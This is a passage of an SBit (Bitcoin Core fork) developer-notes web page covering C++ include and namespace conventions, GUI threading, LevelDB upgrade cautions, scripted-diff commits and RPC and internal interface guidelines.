should be placed on the same line as the brace closing the namespace, e.g.</p></li></ul><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token keyword" style="color:rgb(86, 156, 214)">namespace</span><span class="token plain"> mynamespace </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"> </span><span class="token comment" style="color:rgb(106, 153, 85)">// namespace mynamespace</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">namespace</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(212, 212, 212)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">}</span><span class="token plain"> </span><span class="token comment" style="color:rgb(106, 153, 85)">// namespace</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><ul><li><p><em>Rationale</em>: Avoids confusion about the namespace context.</p></li><li><p>Use <code>#include &lt;primitives/transaction.h&gt;</code> bracket syntax instead of
<code>#include &quot;primitives/transactions.h&quot;</code> quote syntax.</p><ul><li><em>Rationale</em>: Bracket syntax is less ambiguous because the preprocessor
searches a fixed list of include directories without taking location of the
source file into account. This allows quoted includes to stand out more when
the location of the source file actually is relevant.</li></ul></li><li><p>Use include guards to avoid the problem of double inclusion. The header file
<code>foo/bar.h</code> should use the include guard identifier <code>BITCOIN_FOO_BAR_H</code>, e.g.</p></li></ul><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(86, 156, 214)">ifndef</span><span class="token macro property"> </span><span class="token macro property expression">BITCOIN_FOO_BAR_H</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(86, 156, 214)">define</span><span class="token macro property"> </span><span class="token macro property macro-name">BITCOIN_FOO_BAR_H</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token punctuation" style="color:rgb(212, 212, 212)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(86, 156, 214)">endif</span><span class="token macro property"> </span><span class="token macro property comment" style="color:rgb(106, 153, 85)">// BITCOIN_FOO_BAR_H</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="gui">GUI<a class="hash-link" href="#gui" title="Direct link to heading">​</a></h2><ul><li><p>Do not display or manipulate dialogs in model code (classes <code>*Model</code>).</p><ul><li><em>Rationale</em>: Model classes pass through events and data from the core, they
should not interact with the user. That&#x27;s where View classes come in. The converse also
holds: try to not directly access core data structures from Views.</li></ul></li><li><p>Avoid adding slow or blocking code in the GUI thread. In particular, do not
add new <code>interfaces::Node</code> and <code>interfaces::Wallet</code> method calls, even if they
may be fast now, in case they are changed to lock or communicate across
processes in the future.</p><p>Prefer to offload work from the GUI thread to worker threads (see
<code>RPCExecutor</code> in console code as an example) or take other steps (see
<a href="https://doc.qt.io/archives/qq/qq27-responsive-guis.html" target="_blank" rel="noopener noreferrer">https://doc.qt.io/archives/qq/qq27-responsive-guis.html</a>) to keep the GUI
responsive.</p><ul><li><em>Rationale</em>: Blocking the GUI thread can increase latency, and lead to
hangs and deadlocks.</li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="upgrading-leveldb">Upgrading LevelDB<a class="hash-link" href="#upgrading-leveldb" title="Direct link to heading">​</a></h2><p>Extra care must be taken when upgrading LevelDB. This section explains issues
you must be aware of.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="file-descriptor-counts">File Descriptor Counts<a class="hash-link" href="#file-descriptor-counts" title="Direct link to heading">​</a></h3><p>In most configurations, we use the default LevelDB value for <code>max_open_files</code>,
which is 1000 at the time of this writing. If LevelDB actually uses this many
file descriptors, it will cause problems with Bitcoin&#x27;s <code>select()</code> loop, because
it may cause new sockets to be created where the fd value is &gt;= 1024. For this
reason, on 64-bit Unix systems, we rely on an internal LevelDB optimization that
uses <code>mmap()</code> + <code>close()</code> to open table files without actually retaining
references to the table file descriptors. If you are upgrading LevelDB, you must
sanity check the changes to make sure that this assumption remains valid.</p><p>In addition to reviewing the upstream changes in <code>env_posix.cc</code>, you can use <code>lsof</code> to
check this. For example, on Linux this command will show open <code>.ldb</code> file counts:</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">$ </span><span class="token function" style="color:rgb(220, 220, 170)">lsof</span><span class="token plain"> -p </span><span class="token variable" style="color:rgb(156, 220, 254)">$(</span><span class="token variable" style="color:rgb(156, 220, 254)">pidof bitcoind</span><span class="token variable" style="color:rgb(156, 220, 254)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">|</span><span class="token punctuation" style="color:rgb(212, 212, 212)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">    </span><span class="token function" style="color:rgb(220, 220, 170)">awk</span><span class="token plain"> </span><span class="token string" style="color:rgb(206, 145, 120)">&#x27;BEGIN { fd=0; mem=0; } /ldb$/ { if ($4 == &quot;mem&quot;) mem++; else fd++ } END { printf &quot;mem = %s, fd = %s\n&quot;, mem, fd}&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain">mem </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">119</span><span class="token plain">, fd </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>The <code>mem</code> value shows how many files are mmap&#x27;ed, and the <code>fd</code> value shows you
many file descriptors these files are using. You should check that <code>fd</code> is a
small number (usually 0 on 64-bit hosts).</p><p>See the notes in the <code>SetMaxOpenFiles()</code> function in <code>dbwrapper.cc</code> for more
details.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="consensus-compatibility">Consensus Compatibility<a class="hash-link" href="#consensus-compatibility" title="Direct link to heading">​</a></h3><p>It is possible for LevelDB changes to inadvertently change consensus
compatibility between nodes. This happened in Bitcoin 0.8 (when LevelDB was
first introduced). When upgrading LevelDB, you should review the upstream changes
to check for issues affecting consensus compatibility.</p><p>For example, if LevelDB had a bug that accidentally prevented a key from being
returned in an edge case, and that bug was fixed upstream, the bug &quot;fix&quot; would
be an incompatible consensus change. In this situation, the correct behavior
would be to revert the upstream fix before applying the updates to Bitcoin&#x27;s
copy of LevelDB. In general, you should be wary of any upstream changes affecting
what data is returned from LevelDB queries.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="scripted-diffs">Scripted diffs<a class="hash-link" href="#scripted-diffs" title="Direct link to heading">​</a></h2><p>For reformatting and refactoring commits where the changes can be easily automated using a bash script, we use
scripted-diff commits. The bash script is included in the commit message and our Travis CI job checks that
the result of the script is identical to the commit. This aids reviewers since they can verify that the script
does exactly what it is supposed to do. It is also helpful for rebasing (since the same script can just be re-run
on the new master commit).</p><p>To create a scripted-diff:</p><ul><li>start the commit message with <code>scripted-diff:</code> (and then a description of the diff on the same line)</li><li>in the commit message include the bash script between lines containing just the following text:<ul><li><code>-BEGIN VERIFY SCRIPT-</code></li><li><code>-END VERIFY SCRIPT-</code></li></ul></li></ul><p>The scripted-diff is verified by the tool <code>test/lint/commit-script-check.sh</code>. The tool&#x27;s default behavior, when supplied
with a commit is to verify all scripted-diffs from the beginning of time up to said commit. Internally, the tool passes
the first supplied argument to <code>git rev-list --reverse</code> to determine which commits to verify script-diffs for, ignoring
commits that don&#x27;t conform to the commit message format described above.</p><p>For development, it might be more convenient to verify all scripted-diffs in a range <code>A..B</code>, for example:</p><div class="codeBlockContainer_I0IT language-bash theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-bash codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">test/lint/commit-script-check.sh origin/master</span><span class="token punctuation" style="color:rgb(212, 212, 212)">..</span><span class="token plain">HEAD</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="suggestions-and-examples">Suggestions and examples<a class="hash-link" href="#suggestions-and-examples" title="Direct link to heading">​</a></h3><p>If you need to replace in multiple files, prefer <code>git ls-files</code> to <code>find</code> or globbing, and <code>git grep</code> to <code>grep</code>, to
avoid changing files that are not under version control.</p><p>For efficient replacement scripts, reduce the selection to the files that potentially need to be modified, so for
example, instead of a blanket <code>git ls-files src | xargs sed -i s/apple/orange/</code>, use
<code>git grep -l apple src | xargs sed -i s/apple/orange/</code>.</p><p>Also, it is good to keep the selection of files as specific as possible — for example, replace only in directories where
you expect replacements — because it reduces the risk that a rebase of your commit by re-running the script will
introduce accidental changes.</p><p>Some good examples of scripted-diff:</p><ul><li><p><a href="https://github.com/bitcoin/bitcoin/commit/301bd41a2e6765b185bd55f4c541f9e27aeea29d" target="_blank" rel="noopener noreferrer">scripted-diff: Rename InitInterfaces to NodeContext</a>
uses an elegant script to replace occurrences of multiple terms in all source files.</p></li><li><p><a href="https://github.com/bitcoin/bitcoin/commit/8922d7f6b751a3e6b3b9f6fb7961c442877fb65a" target="_blank" rel="noopener noreferrer">scripted-diff: Remove g_connman, g_banman globals</a>
replaces specific terms in a list of specific source files.</p></li><li><p><a href="https://github.com/bitcoin/bitcoin/commit/fac03ec43a15ad547161e37e53ea82482cc508f9" target="_blank" rel="noopener noreferrer">scripted-diff: Replace fprintf with tfm::format</a>
does a global replacement but excludes certain directories.</p></li></ul><p>To find all previous uses of scripted diffs in the repository, do:</p><div class="codeBlockContainer_I0IT theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-text codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token plain">git log --grep=&quot;-BEGIN VERIFY SCRIPT-&quot;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h2 class="anchor anchorWithStickyNavbar_mojV" id="release-notes">Release notes<a class="hash-link" href="#release-notes" title="Direct link to heading">​</a></h2><p>Release notes should be written for any PR that:</p><ul><li>introduces a notable new feature</li><li>fixes a significant bug</li><li>changes an API or configuration model</li><li>makes any other visible change to the end-user experience.</li></ul><p>Release notes should be added to a PR-specific release note file at
<code>/doc/release-notes-&lt;PR number&gt;.md</code> to avoid conflicts between multiple PRs.
All <code>release-notes*</code> files are merged into a single release-notes file prior to the release.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="rpc-interface-guidelines">RPC interface guidelines<a class="hash-link" href="#rpc-interface-guidelines" title="Direct link to heading">​</a></h2><p>A few guidelines for introducing and reviewing new RPC interfaces:</p><ul><li><p>Method naming: use consecutive lower-case names such as <code>getrawtransaction</code> and <code>submitblock</code>.</p><ul><li><em>Rationale</em>: Consistency with the existing interface.</li></ul></li><li><p>Argument naming: use snake case <code>fee_delta</code> (and not, e.g. camel case <code>feeDelta</code>)</p><ul><li><em>Rationale</em>: Consistency with the existing interface.</li></ul></li><li><p>Use the JSON parser for parsing, don&#x27;t manually parse integers or strings from
arguments unless absolutely necessary.</p><ul><li><p><em>Rationale</em>: Introduces hand-rolled string manipulation code at both the caller and callee sites,
which is error-prone, and it is easy to get things such as escaping wrong.
JSON already supports nested data structures, no need to re-invent the wheel.</p></li><li><p><em>Exception</em>: AmountFromValue can parse amounts as string. This was introduced because many JSON
parsers and formatters hard-code handling decimal numbers as floating-point
values, resulting in potential loss of precision. This is unacceptable for
monetary values. <strong>Always</strong> use <code>AmountFromValue</code> and <code>ValueFromAmount</code> when
inputting or outputting monetary values. The only exceptions to this are
<code>prioritisetransaction</code> and <code>getblocktemplate</code> because their interface
is specified as-is in BIP22.</p></li></ul></li><li><p>Missing arguments and &#x27;null&#x27; should be treated the same: as default values. If there is no
default value, both cases should fail in the same way. The easiest way to follow this
guideline is to detect unspecified arguments with <code>params[x].isNull()</code> instead of
<code>params.size() &lt;= x</code>. The former returns true if the argument is either null or missing,
while the latter returns true if is missing, and false if it is null.</p><ul><li><em>Rationale</em>: Avoids surprises when switching to name-based arguments. Missing name-based arguments
are passed as &#x27;null&#x27;.</li></ul></li><li><p>Try not to overload methods on argument type. E.g. don&#x27;t make <code>getblock(true)</code> and <code>getblock(&quot;hash&quot;)</code>
do different things.</p><ul><li><p><em>Rationale</em>: This is impossible to use with <code>sbit-cli</code>, and can be surprising to users.</p></li><li><p><em>Exception</em>: Some RPC calls can take both an <code>int</code> and <code>bool</code>, most notably when a bool was switched
to a multi-value, or due to other historical reasons. <strong>Always</strong> have false map to 0 and
true to 1 in this case.</p></li></ul></li><li><p>Don&#x27;t forget to fill in the argument names correctly in the RPC command table.</p><ul><li><em>Rationale</em>: If not, the call can not be used with name-based arguments.</li></ul></li><li><p>Set okSafeMode in the RPC command table to a sensible value: safe mode is when the
blockchain is regarded to be in a confused state, and the client deems it unsafe to
do anything irreversible such as send. Anything that just queries should be permitted.</p><ul><li><em>Rationale</em>: Troubleshooting a node in safe mode is difficult if half the
RPCs don&#x27;t work.</li></ul></li><li><p>Add every non-string RPC argument <code>(method, idx, name)</code> to the table <code>vRPCConvertParams</code> in <code>rpc/client.cpp</code>.</p><ul><li><em>Rationale</em>: <code>sbit-cli</code> and the GUI debug console use this table to determine how to
convert a plaintext command line to JSON. If the types don&#x27;t match, the method can be unusable
from there.</li></ul></li><li><p>A RPC method must either be a wallet method or a non-wallet method. Do not
introduce new methods that differ in behavior based on the presence of a wallet.</p><ul><li><em>Rationale</em>: As well as complicating the implementation and interfering
with the introduction of multi-wallet, wallet and non-wallet code should be
separated to avoid introducing circular dependencies between code units.</li></ul></li><li><p>Try to make the RPC response a JSON object.</p><ul><li><em>Rationale</em>: If a RPC response is not a JSON object, then it is harder to avoid API breakage if
new data in the response is needed.</li></ul></li><li><p>Wallet RPCs call BlockUntilSyncedToCurrentChain to maintain consistency with
<code>getblockchaininfo</code>&#x27;s state immediately prior to the call&#x27;s execution. Wallet
RPCs whose behavior does <em>not</em> depend on the current chainstate may omit this
call.</p><ul><li><em>Rationale</em>: In previous versions of Bitcoin Core, the wallet was always
in-sync with the chainstate (by virtue of them all being updated in the
same cs_main lock). In order to maintain the behavior that wallet RPCs
return results as of at least the highest best-known block an RPC
client may be aware of prior to entering a wallet RPC call, we must block
until the wallet is caught up to the chainstate as of the RPC call&#x27;s entry.
This also makes the API much easier for RPC clients to reason about.</li></ul></li><li><p>Be aware of RPC method aliases and generally avoid registering the same
callback function pointer for different RPCs.</p><ul><li><p><em>Rationale</em>: RPC methods registered with the same function pointer will be
considered aliases and only the first method name will show up in the
<code>help</code> RPC command list.</p></li><li><p><em>Exception</em>: Using RPC method aliases may be appropriate in cases where a
new RPC is replacing a deprecated RPC, to avoid both RPCs confusingly
showing up in the command list.</p></li></ul></li><li><p>Use <em>invalid</em> bech32 addresses (e.g. in the constant array <code>EXAMPLE_ADDRESS</code>) for
<code>RPCExamples</code> help documentation.</p><ul><li><em>Rationale</em>: Prevent accidental transactions by users and encourage the use
of bech32 addresses by default.</li></ul></li><li><p>Use the <code>UNIX_EPOCH_TIME</code> constant when describing UNIX epoch time or
timestamps in the documentation.</p><ul><li><em>Rationale</em>: User-facing consistency.</li></ul></li></ul><h2 class="anchor anchorWithStickyNavbar_mojV" id="internal-interface-guidelines">Internal interface guidelines<a class="hash-link" href="#internal-interface-guidelines" title="Direct link to heading">​</a></h2><p>Internal interfaces between parts of the codebase that are meant to be
independent (node, wallet, GUI), are defined in
<a href="https://github.com/SBit-Project/sbit/src/interfaces/" target="_blank" rel="noopener noreferrer"><code>src/interfaces/</code></a>. The main interface classes defined
there are <a href="https://github.com/SBit-Project/sbit/src/interfaces/chain.h" target="_blank" rel="noopener noreferrer"><code>interfaces::Chain</code></a>, used by wallet to
access the node&#x27;s latest chain state,
<a href="https://github.com/SBit-Project/sbit/src/interfaces/node.h" target="_blank" rel="noopener noreferrer"><code>interfaces::Node</code></a>, used by the GUI to control the
node, and <a href="https://github.com/SBit-Project/sbit/src/interfaces/wallet.h" target="_blank" rel="noopener noreferrer"><code>interfaces::Wallet</code></a>, used by the GUI
to control an individual wallet. There are also more specialized interface
types like <a href="https://github.com/SBit-Project/sbit/src/interfaces/handler.h" target="_blank" rel="noopener noreferrer"><code>interfaces::Handler</code></a>
<a href="https://github.com/SBit-Project/sbit/src/interfaces/chain.h" target="_blank" rel="noopener noreferrer"><code>interfaces::ChainClient</code></a> passed to and from
various interface methods.</p><p>Interface classes are written in a particular style so node, wallet, and GUI
code doesn&#x27;t need to run in the same process, and so the class declarations
work more easily with tools and libraries supporting interprocess
communication:</p><ul><li><p>Interface classes should be abstract and have methods that are <a href="https://en.cppreference.com/w/cpp/language/abstract_class" target="_blank" rel="noopener noreferrer">pure
virtual</a>. This
allows multiple implementations to inherit from the same interface class,
particularly so one implementation can execute functionality in the local
process, and other implementations can forward calls to remote processes.</p></li><li><p>Interface method definitions should wrap existing functionality instead of
implementing new functionality. Any substantial new node or wallet
functionality should be implemented in <a href="https://github.com/SBit-Project/sbit/src/node/" target="_blank" rel="noopener noreferrer"><code>src/node/</code></a> or
<a href="https://github.com/SBit-Project/sbit/src/wallet/" target="_blank" rel="noopener noreferrer"><code>src/wallet/</code></a> and just exposed in
<a href="https://github.com/SBit-Project/sbit/src/interfaces/" target="_blank" rel="noopener noreferrer"><code>src/interfaces/</code></a> instead of being implemented there,
so it can be more modular and accessible to unit tests.</p></li><li><p>Interface method parameter and return types should either be serializable or
be other interface classes. Interface methods shouldn&#x27;t pass references to
objects that can&#x27;t be serialized or accessed from another process.</p><p>Examples:</p><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// Good: takes string argument and returns interface class pointer</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> unique_ptr</span><span class="token operator" style="color:rgb(212, 212, 212)">&lt;</span><span class="token plain">interfaces</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">Wallet</span><span class="token operator" style="color:rgb(212, 212, 212)">&gt;</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">loadWallet</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">string filename</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// Bad: returns CWallet reference that can&#x27;t be used from another process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> CWallet</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">loadWallet</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token plain">std</span><span class="token double-colon punctuation" style="color:rgb(212, 212, 212)">::</span><span class="token plain">string filename</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// Good: accepts and returns primitive types</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">bool</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">findBlock</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> uint256</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> hash</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> out_height</span><span class="token punctuation" style="color:rgb(212, 212, 212)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">int64_t</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> out_time</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// Bad: returns pointer to internal node in a linked list inaccessible to</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token comment" style="color:rgb(106, 153, 85)">// other processes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#9CDCFE"><span class="token plain"></span><span class="token keyword" style="color:rgb(86, 156, 214)">virtual</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> CBlockIndex</span><span class="token operator" style="color:rgb(212, 212, 212)">*</span><span class="token plain"> </span><span class="token function" style="color:rgb(220, 220, 170)">findBlock</span><span class="token punctuation" style="color:rgb(212, 212, 212)">(</span><span class="token keyword" style="color:rgb(86, 156, 214)">const</span><span class="token plain"> uint256</span><span class="token operator" style="color:rgb(212, 212, 212)">&amp;</span><span class="token plain"> hash</span><span class="token punctuation" style="color:rgb(212, 212, 212)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(212, 212, 212)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(181, 206, 168)">0</span><span class="token punctuation" style="color:rgb(212, 212, 212)">;</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><div class="codeBlockContainer_I0IT language-cpp theme-code-block"><div class="codeBlockContent_wNvx" style="color:#9CDCFE;background-color:#1E1E1E"><pre tabindex="0" class="prism-code language-cpp codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#9CDCFE"><span class="token comment" style="color:rgb(106, 153, 85)">// Good: takes plain callback type and returns interface pointer</span><span class="token plain"></span><br></span><span class="token-line" 